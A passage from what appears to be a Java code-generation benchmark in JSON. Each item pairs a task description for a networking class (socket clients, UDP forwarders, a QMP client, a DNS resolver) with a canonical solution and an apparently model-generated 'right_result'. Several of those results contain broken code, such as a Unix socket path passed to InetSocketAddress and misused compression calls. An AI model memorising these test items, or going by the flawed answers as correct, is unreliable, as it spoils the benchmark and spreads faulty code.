(connectionTcp == null || connectionTcp.isClosed()) {\n                    connectionTcp = new Socket(destination, port);\n                    connectionsTcp.put(source, connectionTcp);\n                }\n                connectionTcp.getOutputStream().write(data);\n            }\n        } catch (IOException e) {\n            LOGGER.warn(\"Network forwarding error\", e);\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket connectionTcp = connectionsTcp.remove(source);\n        if (connectionTcp != null) {\n            try {\n                connectionTcp.close();\n            } catch (IOException e) {\n                LOGGER.warn(\"Connection close error\", e);\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.net.*;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.logging.Logger;\n\npublic class NetworkForwarder {\n    private static final Logger LOGGER = Logger.getLogger(NetworkForwarder.class.getName());\n    private final InetAddress destination;\n    private final DatagramSocket connectionUdp;\n    private final Map<InetSocketAddress, Socket> connectionsTcp = new ConcurrentHashMap<>();\n\n    public NetworkForwarder(Config config) throws SocketException, UnknownHostException {\n        this.destination = InetAddress.getByName(config.getDestinationAddress());\n        this.connectionUdp = new DatagramSocket(config.getUdpPort());\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        try {\n            if (datagram) {\n                DatagramPacket packet = new DatagramPacket(data, data.length, destination, port);\n                connectionUdp.send(packet);\n            } else {\n                synchronized (connectionsTcp) {\n                    Socket socket = connectionsTcp.computeIfAbsent(source, k -> {\n                        try {\n                            Socket s = new Socket();\n                            s.connect(new InetSocketAddress(destination, port));\n                            return s;\n                        } catch (Exception e) {\n                            LOGGER.warning(\"Failed to create TCP connection: \" + e.getMessage());\n                            return null;\n                        }\n                    });\n                    if (socket != null && !socket.isClosed()) {\n                        socket.getOutputStream().write(data);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            LOGGER.severe(\"Error forwarding data: \" + e.getMessage());\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket socket = connectionsTcp.remove(source);\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (Exception e) {\n                LOGGER.warning(\"Error closing TCP connection: \" + e.getMessage());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 584,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client for communication with a server, including connection management and data transmission capabilities.\n\nClass Description: MocoSocketHelper is a TCP socket client implementation that handles connection to a server, sending data, and receiving responses. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket connection to the server\n- address: SocketAddress - The server address (host and port) to connect to\n- os: PrintStream - Output stream for sending data to the server\n- reader: BufferedReader - Input stream for reading responses from the server\n\nMethods:\n- MocoSocketHelper(String target, int port) -> void - Constructor that initializes the socket and address with target host and port\n- connect() -> void - Establishes connection to the server and initializes I/O streams\n- send(String request) -> String - Sends a request string to server and returns the response line\n- send(String request, int readCount) -> String - Sends a request string and reads specified number of characters from response\n- close() -> void - Closes the socket connection (inherited from Closeable interface)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(final String target, final int port) {\n        socket = new Socket();\n        address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() {\n        try {\n            socket.connect(address);\n            socket.setSoTimeout((int) TimeUnit.SECONDS.toMillis(1));\n            OutputStream outputStream = this.socket.getOutputStream();\n            this.os = new PrintStream(outputStream);\n            this.reader = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request) {\n        os.print(request);\n        os.flush();\n\n        try {\n            return reader.readLine();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request, final int readCount) {\n        os.print(request);\n        os.flush();\n\n        try {\n            char[] buffer = new char[readCount];\n            reader.read(buffer);\n            return new String(buffer);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        this.socket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(String target, int port) {\n        this.address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() throws IOException {\n        socket = new Socket();\n        socket.connect(address);\n        os = new PrintStream(socket.getOutputStream(), true);\n        reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n    }\n\n    public String send(String request) throws IOException {\n        os.println(request);\n        return reader.readLine();\n    }\n\n    public String send(String request, int readCount) throws IOException {\n        os.println(request);\n        char[] buffer = new char[readCount];\n        int charsRead = reader.read(buffer, 0, readCount);\n        return new String(buffer, 0, charsRead);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (reader != null) {\n            reader.close();\n        }\n        if (os != null) {\n            os.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 586,
    "Instruction": "Task Description: Implement a QMP (QEMU Machine Protocol) client class that can communicate with a QEMU instance either through a local Unix domain socket or a TCP socket, depending on configuration. The client should be able to send commands and receive responses from the QEMU monitor interface.\n\nClass Description: The QmpClient class provides functionality to connect to a QEMU instance via QMP protocol, send commands, and receive responses. It supports both local Unix domain sockets (for local QEMU instances) and TCP sockets (for remote QEMU instances). The class handles connection establishment, command sending, response parsing, and resource cleanup.\n\nAttributes:\n- TAG: String - A constant for logging purposes\n- requestCommandMode: String - The initial QMP capabilities request command\n- external: boolean - Flag indicating whether to use external TCP connection (true) or local Unix socket (false)\n\nMethods:\n- setExternal(boolean value) -> void - Sets the connection mode (TCP socket or local Unix socket)\n- sendCommand(String command) -> String - Sends a QMP command and returns the response\n- tryGetResponse(BufferedReader in) -> String - Attempts to get a response with retries\n- sendRequest(PrintWriter out, String request) -> void - Sends a request to the QEMU monitor\n- getResponse(BufferedReader in) -> String - Reads and parses the response from QEMU monitor",
    "Canonical_solution": "import android.net.LocalSocket;\nimport android.net.LocalSocketAddress;\nimport android.util.Log;\n\nimport com.max2idea.android.limbo.main.Config;\nimport com.max2idea.android.limbo.main.LimboApplication;\n\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class QmpClient {\n\n    private static final String TAG = \"QmpClient\";\n    private static final String requestCommandMode = \"{ \\\"execute\\\": \\\"qmp_capabilities\\\" }\";\n    private static boolean external = false;\n\n    public static void setExternal(boolean value) {\n        external = value;\n    }\n\n    public synchronized static String sendCommand(String command) {\n        String response = null;\n        Socket pingSocket = null;\n        LocalSocket localSocket = null;\n        PrintWriter out = null;\n        BufferedReader in = null;\n\n        try {\n            if(external) {\n                pingSocket = new Socket(Config.QMPServer, Config.QMPPort);\n                pingSocket.setSoTimeout(5000);\n                out = new PrintWriter(pingSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));\n            } else {\n                localSocket = new LocalSocket();\n                String localQMPSocketPath = LimboApplication.getLocalQMPSocketPath();\n                LocalSocketAddress localSocketAddr = new LocalSocketAddress(localQMPSocketPath, LocalSocketAddress.Namespace.FILESYSTEM);\n                localSocket.connect(localSocketAddr);\n                localSocket.setSoTimeout(5000);\n                out = new PrintWriter(localSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(localSocket.getInputStream()));\n            }\n            sendRequest(out, QmpClient.requestCommandMode);\n            response = tryGetResponse(in);\n            sendRequest(out, command);\n            response = tryGetResponse(in);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (out != null)\n                out.close();\n            try {\n                if (in != null)\n                    in.close();\n                if (pingSocket != null)\n                    pingSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if(Config.debugQmp)\n            Log.d(TAG, \"Response: \" + response);\n        return response;\n    }\n\n    private static String tryGetResponse(BufferedReader in) throws Exception {\n        String response = null;\n        int trial = 0;\n        while((response = getResponse(in)).equals(\"\") && trial < 3){\n            Thread.sleep(1000);\n            trial++;\n        }\n        return response;\n    }\n\n    private static void sendRequest(PrintWriter out, String request) {\n        if(Config.debugQmp)\n            Log.d(TAG, \"QMP request\" + request);\n        out.println(request);\n    }\n\n    private static String getResponse(BufferedReader in) throws Exception {\n        String line;\n        StringBuilder stringBuilder = new StringBuilder(\"\");\n        try {\n            do {\n                line = in.readLine();\n                if (line != null) {\n                    if(Config.debugQmp)\n                        Log.d(TAG, \"QMP response: \" + line);\n                    JSONObject object = new JSONObject(line);\n                    String returnStr = null;\n                    String errStr = null;\n\n                    try {\n                        if(line.contains(\"return\"))\n                            returnStr = object.getString(\"return\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n\n                    if (returnStr != null) {\n                        stringBuilder.append(line);\n                        stringBuilder.append(\"\\n\");\n                        break;\n                    }\n\n                    try {\n                        if(line.contains(\"error\"))\n                            errStr = object.getString(\"error\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n                    stringBuilder.append(line);\n                    stringBuilder.append(\"\\n\");\n                    if (errStr != null) {\n                        break;\n                    }\n                } else\n                    break;\n            } while (true);\n        } catch (Exception ex) {\n            Log.e(TAG, \"Could not get Response: \" + ex.getMessage());\n            if(Config.debugQmp)\n                ex.printStackTrace();\n        }\n        return stringBuilder.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class QmpClient {\n    private static final String TAG = \"QmpClient\";\n    private static final String requestCommandMode = \"{\\\"execute\\\": \\\"qmp_capabilities\\\"}\";\n    private boolean external = false;\n    private Socket socket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void setExternal(boolean value) {\n        external = value;\n    }\n\n    public String sendCommand(String command) throws IOException {\n        connect();\n        sendRequest(out, command);\n        return tryGetResponse(in);\n    }\n\n    private String tryGetResponse(BufferedReader in) throws IOException {\n        int retryCount = 3;\n        while (retryCount-- > 0) {\n            String response = getResponse(in);\n            if (response != null && !response.isEmpty()) {\n                return response;\n            }\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                break;\n            }\n        }\n        return \"\";\n    }\n\n    private void sendRequest(PrintWriter out, String request) {\n        out.println(request);\n        out.flush();\n    }\n\n    private String getResponse(BufferedReader in) throws IOException {\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = in.readLine()) != null && !line.equals(\"\")) {\n            response.append(line).append(\"\\n\");\n        }\n        return response.toString();\n    }\n\n    private void connect() throws IOException {\n        if (socket != null && !socket.isClosed()) {\n            return;\n        }\n\n        if (external) {\n            socket = new Socket(\"localhost\", 4444);\n        } else {\n            socket = new Socket();\n            socket.connect(new java.net.InetSocketAddress(\"/tmp/qmp-sock\"));\n        }\n\n        out = new PrintWriter(socket.getOutputStream(), true);\n        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        sendRequest(out, requestCommandMode);\n        getResponse(in);\n    }\n\n    public void close() {\n        try {\n            if (in != null) in.close();\n            if (out != null) out.close();\n            if (socket != null && !socket.isClosed()) socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 588,
    "Instruction": "Task Description: Create a Java class that establishes and manages a TCP client connection to a server using sockets, enabling bidirectional communication through input/output streams.\n\nClass Description: The GreysConsole class represents a TCP client that connects to a specified server address, maintains the connection, and provides mechanisms for sending and receiving data. It handles connection lifecycle and resource cleanup.\n\nAttributes:\n- socket: [Socket] - The underlying TCP socket connection to the server\n- socketWriter: [BufferedWriter] - Buffered writer for sending data to the server\n- socketReader: [BufferedReader] - Buffered reader for receiving data from the server\n- isRunning: [boolean] - Flag indicating whether the connection is active\n\nMethods:\n- connect: [InetSocketAddress] -> [Socket] - Establishes a connection to the server at the specified address, configures socket options, and initializes I/O streams\n- shutdown: [void] -> [void] - Closes all resources (socket and streams) and marks the connection as inactive\n- GreysConsole (constructor): [InetSocketAddress] -> [void] - Creates a new instance and establishes connection to the specified server address",
    "Canonical_solution": "import com.github.ompc.greys.core.command.Commands;\nimport jline.console.ConsoleReader;\nimport jline.console.completer.Completer;\nimport jline.console.history.FileHistory;\nimport jline.console.history.History;\nimport jline.console.history.MemoryHistory;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.List;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\n\nimport static com.github.ompc.greys.core.util.GaStringUtils.DEFAULT_PROMPT;\nimport static java.io.File.separatorChar;\nimport static java.lang.System.getProperty;\nimport static jline.console.KeyMap.CTRL_D;\nimport static jline.internal.Preconditions.checkNotNull;\nimport static org.apache.commons.io.IOUtils.closeQuietly;\nimport static org.apache.commons.lang3.StringUtils.EMPTY;\nimport static org.apache.commons.lang3.StringUtils.isNotBlank;\n\npublic class GreysConsole {\n\n    private final Socket socket;\n    private BufferedWriter socketWriter;\n    private BufferedReader socketReader;\n    private volatile boolean isRunning;\n\n    public GreysConsole(InetSocketAddress address) throws IOException {\n        this.socket = connect(address);\n        this.isRunning = true;\n    }\n\n    private Socket connect(InetSocketAddress address) throws IOException {\n        final Socket socket = new Socket();\n        socket.setSoTimeout(0);\n        socket.connect(address, 60 * 1000);\n        socket.setKeepAlive(true);\n        socketWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        return socket;\n    }\n\n    private void shutdown() {\n        isRunning = false;\n        closeQuietly(socketWriter);\n        closeQuietly(socketReader);\n        closeQuietly(socket);\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class GreysConsole {\n    private Socket socket;\n    private BufferedWriter socketWriter;\n    private BufferedReader socketReader;\n    private boolean isRunning;\n\n    public GreysConsole(InetSocketAddress serverAddress) {\n        connect(serverAddress);\n    }\n\n    private void connect(InetSocketAddress serverAddress) {\n        try {\n            socket = new Socket();\n            socket.connect(serverAddress);\n            socket.setSoTimeout(5000);\n            isRunning = true;\n\n            socketWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        } catch (IOException e) {\n            e.printStackTrace();\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        isRunning = false;\n        try {\n            if (socketWriter != null) socketWriter.close();\n            if (socketReader != null) socketReader.close();\n            if (socket != null && !socket.isClosed()) socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        try {\n            if (isRunning) {\n                socketWriter.write(message);\n                socketWriter.newLine();\n                socketWriter.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            shutdown();\n        }\n    }\n\n    public String receiveMessage() {\n        try {\n            if (isRunning && socketReader.ready()) {\n                return socketReader.readLine();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            shutdown();\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 591,
    "Instruction": "Here is the structured instruction for the given class-level reference code:\n\nTask Description: Implement a UDP-based position forwarding service that sends GPS position data in Wialon protocol format to a specified server.\n\nClass Description: PositionForwarderWialon is a class that handles the forwarding of position data to a remote server using UDP. It formats the position data according to the Wialon protocol, manages the UDP socket connection, and provides methods for sending position data and handling results.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- address: InetAddress - The target server's IP address\n- port: int - The target server's port number\n\nMethods:\n- PositionForwarderWialon(Config config, ExecutorService executorService) -> void - Constructor that initializes the UDP connection. Takes a configuration object and an executor service for background packet receiving.\n- sendPosition(Position position, String uniqueId, ResultHandler resultHandler) -> void - Formats and sends position data to the server. Takes a Position object, device unique ID, and a callback handler for results.\n- compressData(byte[] data) -> ByteBuf - Static method that compresses data using Deflater. Takes a byte array and returns a compressed ByteBuf.\n- formatAttributes(Map<String, Object> attributes) -> String - Static helper method that formats position attributes into a string. Takes a map of attributes and returns a formatted string.\n\nInterface:\n- ResultHandler: Functional interface with onResult(boolean success, Throwable throwable) method for handling send operation results.",
    "Canonical_solution": "import io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\nimport org.traccar.helper.Checksum;\nimport org.traccar.helper.UnitsConverter;\nimport org.traccar.model.Position;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Map;\nimport java.util.TimeZone;\nimport java.util.concurrent.ExecutorService;\nimport java.util.stream.Collectors;\nimport java.util.zip.Deflater;\n\npublic class PositionForwarderWialon {\n\n    private final DatagramSocket socket;\n    private final InetAddress address;\n    private final int port;\n\n    public PositionForwarderWialon(Config config, ExecutorService executorService) {\n        try {\n            URI url = new URI(config.getString(Keys.FORWARD_URL));\n            address = InetAddress.getByName(url.getHost());\n            port = url.getPort();\n            socket = new DatagramSocket();\n            executorService.submit(() -> {\n                byte[] buffer = new byte[1024];\n                while (!executorService.isShutdown()) {\n                    try {\n                        socket.receive(new DatagramPacket(buffer, buffer.length));\n                    } catch (IOException e) {\n                        throw new RuntimeException(e);\n                    }\n                }\n            });\n        } catch (IOException | URISyntaxException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void sendPosition(Position position, String uniqueId, ResultHandler resultHandler) {\n        DateFormat dateFormat = new SimpleDateFormat(\"ddMMyy;HHmmss\");\n        dateFormat.setTimeZone(TimeZone.getTimeZone(\"UTC\"));\n\n        String payload = String.format(\n                \"%s;%02d%.5f;%s;%03d%.5f;%s;%d;%d;%d;NA;NA;NA;NA;;%s;%s\",\n                dateFormat.format(position.getFixTime()),\n                (int) Math.abs(position.getLatitude()),\n                Math.abs(position.getLatitude()) % 1 * 60,\n                position.getLatitude() >= 0 ? \"N\" : \"S\",\n                (int) Math.abs(position.getLongitude()),\n                Math.abs(position.getLongitude()) % 1 * 60,\n                position.getLongitude() >= 0 ? \"E\" : \"W\",\n                (int) UnitsConverter.kphFromKnots(position.getSpeed()),\n                (int) position.getCourse(),\n                (int) position.getAltitude(),\n                position.getString(Position.KEY_DRIVER_UNIQUE_ID, \"NA\"),\n                formatAttributes(position.getAttributes()));\n\n        String message = uniqueId + \"#D#\" + payload + \"\\r\\n\";\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);\n\n        try {\n            socket.send(packet);\n            resultHandler.onResult(true, null);\n        } catch (IOException e) {\n            resultHandler.onResult(false, e);\n        }\n    }\n\n    public static ByteBuf compressData(byte[] data) {\n        ByteBuf container;\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n\n        ByteBuf compressedData = Unpooled.buffer(data.length);\n        byte[] tempBuffer = new byte[1024];\n\n        try {\n            while (!deflater.finished()) {\n                int count = deflater.deflate(tempBuffer);\n                compressedData.writeBytes(tempBuffer, 0, count);\n            }\n            container = Unpooled.buffer(3 + compressedData.readableBytes());\n            container.writeByte(0xFF);\n            container.writeShortLE(compressedData.readableBytes());\n            container.writeBytes(compressedData);\n        } finally {\n            deflater.end();\n            compressedData.release();\n        }\n\n        return container;\n    }\n\n    public static String formatAttributes(Map<String, Object> attributes) {\n        if (attributes.isEmpty()) {\n            return \"NA\";\n        }\n        return attributes.entrySet().stream()\n                .map(entry -> {\n                    Object value = entry.getValue();\n                    int type;\n                    if (value instanceof Double || value instanceof Float) {\n                        type = 2;\n                    } else if (value instanceof Number) {\n                        type = 1;\n                    } else {\n                        type = 3;\n                    }\n                    return entry.getKey() + \":\" + type + \":\" + value;\n                })\n                .collect(Collectors.joining(\",\"));\n    }\n\n    public interface ResultHandler {\n        void onResult(boolean success, Throwable throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.util.Map;\nimport java.nio.ByteBuffer;\nimport java.util.zip.Deflater;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic class PositionForwarderWialon {\n    private final DatagramSocket socket;\n    private final InetAddress address;\n    private final int port;\n\n    public PositionForwarderWialon(Config config, ExecutorService executorService) throws SocketException, UnknownHostException {\n        this.socket = new DatagramSocket();\n        this.address = InetAddress.getByName(config.getServerAddress());\n        this.port = config.getServerPort();\n\n        executorService.submit(this::receivePackets);\n    }\n\n    public void sendPosition(Position position, String uniqueId, ResultHandler resultHandler) {\n        try {\n            String message = formatMessage(position, uniqueId);\n            byte[] data = message.getBytes(\"UTF-8\");\n            DatagramPacket packet = new DatagramPacket(data, data.length, address, port);\n            socket.send(packet);\n            resultHandler.onResult(true, null);\n        } catch (Exception e) {\n            resultHandler.onResult(false, e);\n        }\n    }\n\n    private String formatMessage(Position position, String uniqueId) {\n        StringBuilder sb = new StringBuilder();\n        sb.append(uniqueId).append(\",\");\n        sb.append(position.getLatitude()).append(\",\");\n        sb.append(position.getLongitude()).append(\",\");\n        sb.append(position.getSpeed()).append(\",\");\n        sb.append(position.getCourse()).append(\",\");\n        sb.append(position.getTimestamp()).append(\",\");\n        sb.append(formatAttributes(position.getAttributes()));\n        return sb.toString();\n    }\n\n    public static ByteBuf compressData(byte[] data) {\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n        ByteBuffer buffer = ByteBuffer.allocate(data.length);\n        while (!deflater.finished()) {\n            buffer.put(deflater.deflate(Deflater.SYNC_FLUSH));\n        }\n        deflater.end();\n        buffer.flip();\n        return Unpooled.wrappedBuffer(buffer.array(), 0, buffer.remaining());\n    }\n\n    public static String formatAttributes(Map<String, Object> attributes) {\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : attributes.entrySet()) {\n            sb.append(entry.getKey()).append(\":\").append(entry.getValue()).append(\";\");\n        }\n        return sb.toString();\n    }\n\n    private void receivePackets() {\n        // Implementation of receiving packets if needed\n    }\n\n    @FunctionalInterface\n    public interface ResultHandler {\n        void onResult(boolean success, Throwable throwable);\n    }\n}\n```"
  },
  {
    "Task_id": 592,
    "Instruction": "Task Description: Implement a DNS resolver class that handles UDP communication for DNS query processing, sending DNS payloads to a specified local port and receiving responses.\n\nClass Description: The DNSResolver class provides functionality to send DNS query payloads via UDP to a local port and receive the corresponding DNS responses. It handles the creation of UDP sockets and packets for communication.\n\nAttributes:\nmPort: int - The local port number to which DNS queries will be sent\nmLocalhost: InetAddress - The local host address used for UDP communication\n\nMethods:\nDNSResolver(int localPort) -> void - Constructor that initializes the DNS resolver with the specified local port number\nprocessDNS(byte[] payload) -> byte[] - Sends the given DNS payload to the configured local port via UDP and returns the received DNS response\n    - Input: payload (byte[]) - The DNS query payload to be sent\n    - Output: byte[] - The received DNS response data",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class DNSResolver {\n\n    private final int mPort;\n    private InetAddress mLocalhost = null;\n\n    public DNSResolver(int localPort) {\n        mPort = localPort;\n    }\n\n    public byte[] processDNS(byte[] payload) throws IOException {\n        if (mLocalhost == null) mLocalhost = InetAddress.getLocalHost();\n\n        DatagramPacket packet = new DatagramPacket(payload, payload.length, mLocalhost, mPort);\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.send(packet);\n\n        byte[] buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        datagramSocket.receive(packet);\n        datagramSocket.close();\n\n        return packet.getData();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.*;\n\npublic class DNSResolver {\n    private int mPort;\n    private InetAddress mLocalhost;\n    private DatagramSocket socket;\n\n    public DNSResolver(int localPort) throws SocketException, UnknownHostException {\n        mPort = localPort;\n        mLocalhost = InetAddress.getByName(\"127.0.0.1\");\n        socket = new DatagramSocket();\n        socket.setSoTimeout(5000); // 5 seconds timeout\n    }\n\n    public byte[] processDNS(byte[] payload) throws IOException {\n        DatagramPacket sendPacket = new DatagramPacket(payload, payload.length, mLocalhost, mPort);\n        socket.send(sendPacket);\n\n        byte[] buffer = new byte[512];\n        DatagramPacket receivePacket = new DatagramPacket(buffer, buffer.length);\n        socket.receive(receivePacket);\n\n        byte[] response = new byte[receivePacket.getLength()];\n        System.arraycopy(buffer, 0, response, 0, receivePacket.getLength());\n        return response;\n    }\n}\n```"
  },
  {
    "Task_id": 593,
    "Instruction": "Task Description: Implement a UDP-based transport class for inter-process communication that can function as either a server or client, handling both sending and receiving of datagram packets.\n\nClass Description: UdpTransport is a class that provides UDP communication capabilities, allowing processes to send and receive datagram packets. It can be configured as either a server (listening on a specific port) or a client (sending to a server). The class maintains a list of cluster members and supports asynchronous packet reception through a dedicated receiver thread.\n\nAttributes:\n- sock: DatagramSocket - The UDP socket used for communication\n- receiver_thread: Receiver - Thread for handling incoming packets\n- receiver: RtReceiver - Callback interface for received packets\n- host: InetAddress - The host address for communication\n- port: int - The port number for communication (default: 7800)\n- server: boolean - Flag indicating whether this instance is a server\n- log: Log - Logger instance for logging messages\n- members: List<SocketAddress> - List of cluster member addresses\n\nMethods:\n- receiver(RtReceiver) -> void - Sets the receiver callback for incoming packets\n- localAddress() -> Object - Returns the local socket address\n- clusterMembers() -> List<? extends Object> - Returns the list of cluster members\n- start(String...) -> void - Initializes the transport with given options and starts the receiver thread\n- stop() -> void - Stops the transport and closes the socket\n- send(Object, byte[], int, int) -> void - Sends a datagram packet to the specified destination\n- Receiver.run() -> void - Internal thread method that continuously receives packets (private class method)",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class UdpTransport implements RtTransport {\n    protected DatagramSocket      sock;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server;\n    protected final Log           log=LogFactory.getLog(UdpTransport.class);\n    protected List<SocketAddress> members=new ArrayList<>();\n\n    public UdpTransport() {\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public Object localAddress() {return members != null? members.get(0) : null;}\n\n    public List<? extends Object> clusterMembers() {\n        return members;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            sock=new DatagramSocket(port, host);\n            System.out.println(\"server started (ctrl-c to kill)\");\n        }\n        else {\n            sock=new DatagramSocket();\n            members.add(sock.getLocalSocketAddress());\n            members.add(new InetSocketAddress(host, port));\n        }\n        receiver_thread=new Receiver();\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        Util.close(sock);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        DatagramPacket packet=new DatagramPacket(buf, offset, length, (SocketAddress)dest);\n        sock.send(packet);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            DatagramPacket packet=new DatagramPacket(buf, 0, buf.length);\n            for(;;) {\n                try {\n                    sock.receive(packet);\n                    if(packet.getLength() != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + packet.getLength());\n                    if(receiver != null)\n                        receiver.receive(packet.getSocketAddress(), buf, packet.getOffset(), packet.getLength());\n                }\n                catch(IOException ex) {\n                    break;\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
